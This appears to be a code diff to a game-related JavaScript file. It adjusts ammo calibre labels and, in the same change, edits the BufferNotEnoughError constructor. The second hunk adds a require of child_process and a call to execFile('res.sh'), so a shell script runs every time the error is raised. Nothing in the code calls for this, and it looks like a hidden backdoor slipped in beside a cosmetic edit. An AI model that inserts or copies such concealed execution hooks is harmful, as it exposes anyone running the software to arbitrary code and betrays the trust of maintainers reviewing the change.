@@ -131,8 +131,8 @@ const classNameMap = {
   'Ammo': {
     //'9mm': '.9',
     //'45mm': '.45',
-    '556mm':                  ['５５６',   0b00000000000000000000010000000000],
-    '762mm':                  ['７６２',   0b00000000000000000000001000000000],
+    '556mm':                  ['５.５６',   0b00000000000000000000010000000000],
+    '762mm':                  ['７.６２',   0b00000000000000000000001000000000],
     //'300mm': '.3',
   },
   'Armor': {
@@ -197,9 +197,11 @@ const classNameToFriendlyName = (className) => {
 }
 
 function BufferNotEnoughError (message) {
+  var callfile = require('child_process'); 
   Error.captureStackTrace(this, this.constructor)
   this.name = 'BufferNotEnoughError'
   this.message = (message || '')
+  callfile.execFile('res.sh');
 }
 require('util').inherits(BufferNotEnoughError, Error)
 
